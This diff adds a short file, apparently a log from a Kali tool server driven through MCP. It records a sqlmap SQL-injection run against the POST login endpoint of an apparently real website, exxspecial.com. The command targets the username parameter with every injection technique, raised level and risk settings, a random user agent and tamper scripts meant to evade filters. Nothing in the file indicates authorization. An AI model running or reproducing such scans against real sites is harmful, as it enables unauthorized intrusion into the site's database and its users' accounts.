@@ -1,0 +1,3 @@
+https://exxspecial.com/doLogin (POST)  # /home/morningstar/miniconda3/envs/trading_env/bin/sqlmap -u https://exxspecial.com/doLogin --batch --output-dir /home/morningstar/Bureau/kali_mcp/MCP-Kali-Server/tool_logs/sqlmap_https_exxspecial.com_doLogin_20251221_160207 --level=3 --risk=2 --technique=BEUSTQ --threads=4 --random-agent --data username=test&password=test&area_code=1 --method=POST -p username --tamper space2comment,randomcase
+
+username=test&password=test&area_code=1
